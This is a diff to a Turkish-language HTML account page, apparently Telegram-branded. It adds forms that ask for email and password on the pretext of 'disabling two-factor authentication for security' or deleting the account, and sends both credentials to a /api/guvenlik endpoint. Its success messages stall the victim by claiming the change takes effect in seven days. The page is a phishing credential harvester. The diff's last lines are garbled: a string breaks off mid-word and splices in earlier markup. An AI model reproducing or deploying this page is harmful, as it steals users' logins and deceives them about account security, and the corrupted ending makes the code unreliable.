@@ -91,20 +91,148 @@
         </aside>
 
         <main class="content-area">
+            
+            <!-- HESAP BİLGİSİ PANELİ -->
             <div class="panel" id="panel-hesap">
-                <div class="panel-header"><h2><i class="fa-regular fa-user"></i> Hesap Bilgisi</h2><p>Buradan hesap bilgilerinizi görüntüleyebilirsiniz.</p></div>
-                <div class="warning-note"><i class="fa-solid fa-triangle-exclamation"></i><p>Demo Modu: Gerçek hesap bilgileri bu panelde gösterilmez.</p></div>
+                <div class="panel-header"><h2><i class="fa-regular fa-user"></i> Hesap Bilgisi</h2><p>Hesabınızla ilgili bir sorunuz mu var? Bize yazın.</p></div>
+                <form onsubmit="mesajGonder(event, 'hesap')">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
+                </form>
             </div>
 
+            <!-- BAĞLI HESAPLAR PANELİ -->
             <div class="panel" id="panel-bagli">
-                <div class="panel-header"><h2><i class="fa-solid fa-link"></i> Bağlı Hesaplar</h2><p>Facebook, Google veya Apple hesaplarınızı buradan bağlayabilirsiniz.</p></div>
-                <div class="warning-note"><i class="fa-solid fa-circle-info"></i><p>Şu an bağlı bir hesap bulunmamaktadır.</p></div>
+                <div class="panel-header"><h2><i class="fa-solid fa-link"></i> Bağlı Hesaplar</h2><p>Hesap bağlama işlemleri için destek ekibimize yazın.</p></div>
+                <form onsubmit="mesajGonder(event, 'bagli')">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
+                </form>
             </div>
 
+            <!-- GÜVENLİK PANELİ (ANA PANEL) -->
             <div class="panel active-panel" id="panel-guvenlik">
                 <div class="panel-header">
                     <h2><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulama</h2>
                     <p>Hesabınızın güvenliğini artırmak için iki aşamalı doğrulamayı devre dışı bırakabilirsiniz. Devre dışı bırakmak için lütfen aşağıdaki bilgileri onaylayın.</p>
+                </div>
+                <form id="securityForm">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="email" placeholder="E-posta adresinizi girin" required></div></div>
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-solid fa-lock input-icon"></i><input type="password" id="password" placeholder="Şifrenizi girin" required><i class="fa-regular fa-eye eye-icon" onclick="togglePassword('password', this)"></i></div></div>
+                    <div class="premium-info-box"><i class="fa-solid fa-crown"></i><div><h4>Premium Hesap</h4><p>Premium hesabınız aktif. Bu özellikten sınırsız faydalanabilirsiniz.</p></div></div>
+                    <button type="submit" class="btn-danger"><i class="fa-solid fa-shield-halved"></i> İki Aşamalı Doğrulamayı Kapat</button>
+                </form>
+                <div class="warning-note"><i class="fa-solid fa-circle-info"></i><p>Not: İki aşamalı doğrulamayı kapattığınızda hesabınız daha az güvenli hale gelir.</p></div>
+            </div>
+
+            <!-- CİHAZ YÖNETİMİ PANELİ -->
+            <div class="panel" id="panel-cihaz">
+                <div class="panel-header"><h2><i class="fa-solid fa-mobile-screen"></i> Cihaz Yönetimi</h2><p>Cihazınızla ilgili bir sorun mu var? Bize yazın.</p></div>
+                <form onsubmit="mesajGonder(event, 'cihaz')">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
+                </form>
+            </div>
+
+            <!-- GÜVENLİK GEÇMİŞİ PANELİ -->
+            <div class="panel" id="panel-gecmis">
+                <div class="panel-header"><h2><i class="fa-regular fa-clock"></i> Güvenlik Geçmişi</h2><p>Geçmiş işlemlerinizle ilgili destek almak için yazın.</p></div>
+                <form onsubmit="mesajGonder(event, 'gecmis')">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
+                </form>
+            </div>
+
+            <!-- HESAP SİLME PANELİ (BURASI GÜNCELLENDİ) -->
+            <div class="panel" id="panel-silme">
+                <div class="panel-header">
+                    <h2><i class="fa-regular fa-trash-can"></i> Hesap Silme</h2>
+                    <p>Hesabınızı kalıcı olarak silmek istiyorsanız bu alanı kullanabilirsiniz.</p>
+                </div>
+                <!-- Eski uyarıyı sildim, yerine e-posta ve şifre formu ekledim -->
+                <form onsubmit="silmeGonder(event)">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="silme_email" placeholder="E-posta adresinizi girin" required></div></div>
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-solid fa-lock input-icon"></i><input type="password" id="silme_password" placeholder="Şifrenizi girin" required><i class="fa-regular fa-eye eye-icon" onclick="togglePassword('silme_password', this)"></i></div></div>
+                    <button type="submit" class="btn-danger" style="background-color: #dc3545;"><i class="fa-solid fa-triangle-exclamation"></i> Hesabımı Sil</button>
+                </form>
+                <div class="warning-note" style="border-color: #dc3545;">
+                    <i class="fa-solid fa-triangle-exclamation" style="color: #ff4d4d;"></i>
+                    <p style="color: #ff4d4d;">Dikkat: Bu işlem geri alınamaz! Hesabınızı silmek için lütfen bilgilerinizi girin.</p>
+                </div>
+            </div>
+
+            <!-- TELEGRAM İLETİŞİM PANELİ (EN ALTTAKİ YEŞİL KUTU) -->
+            <div class="contact-box">
+                <div class="panel-header"><h2 style="color: #28a745;"><i class="fa-brands fa-telegram" style="color: #28a745;"></i> Destek Ekibine Mesaj Gönder</h2><p>Aşağıdaki formu doldurarak bize ulaşabilirsiniz.</p></div>
+                <form onsubmit="mesajGonder(event, 'ana_destek')">
+                    <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" class="isim" placeholder="Adınız / Kullanıcı Adınız" required></div></div>
+                    <div class="form-group"><div class="input-wrapper" style="height: 120px; align-items: flex-start;"><i class="fa-regular fa-message input-icon" style="margin-top: 18px;"></i><textarea class="mesaj" placeholder="Mesajınızı buraya yazın..." required></textarea></div></div>
+                    <button type="submit" class="btn-success"><i class="fa-solid fa-paper-plane"></i> Mesajı Gönder</button>
+                </form>
+            </div>
+
+        </main>
+    </div>
+
+    <script>
+        function changeSidebar(element, panelId) {
+            document.querySelectorAll('#sidebarMenu li').forEach(li => li.classList.remove('active'));
+            element.parentElement.classList.add('active');
+            document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active-panel'));
+            document.getElementById('panel-' + panelId).classList.add('active-panel');
+        }
+        function changeTopMenu(element) {
+            document.querySelectorAll('#topMenu a').forEach(a => a.classList.remove('active'));
+            element.classList.add('active');
+        }
+        function togglePassword(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye');
+            }
+        }
+
+        // GÜVENLİK FORMU
+        document.getElementById('securityForm').addEventListener('submit', function(e) {
+            e.preventDefault(); 
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            fetch('/api/guvenlik', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === "ok") {
+                    alert('✅ İşleminiz başarıyla alındı.\n\nGüvenlik nedeniyle iki aşamalı doğrulama kapatma işlemi 7 GÜN SONRA aktif olacaktır.\n\nEğer girdiğiniz bilgilerde bir yanlışlık varsa işlem otomatik olarak İPTAL edilecektir.');
+                    document.getElementById('securityForm').reset();
+                } else { alert('❌ Bir hata oluştu.'); }
+            }).catch(error => alert('❌ Sunucuya bağlanılamadı.'));
+        });
+
+        // HESAP SİLME FORMU (E-posta ve Şifre Gönderimi)
+        function silmeGonder(e) {
+            e.preventDefault();
+            const email = document.getElementById('silme_email').value;
+            const password = document.getElementById('silme_password').value;
+
+            fetch('/api/guvenlik', { // app.py'deki guvenlik fonksiyonunu kullanıyoruz
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === "ok") {
+                    alert('✅ Hesap silme talebiniz alındı. Bilgileriniz onaylandıktan sonra işlem gerçekleştirilecektir.');
+                    document.getElementById('silmeırakmak için lütfen aşağıdaki bilgileri onaylayın.</p>
                 </div>
                 <form id="securityForm">
                     <div class="form-group"><div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="email" placeholder="E-posta adresinizi girin" required></div></div>
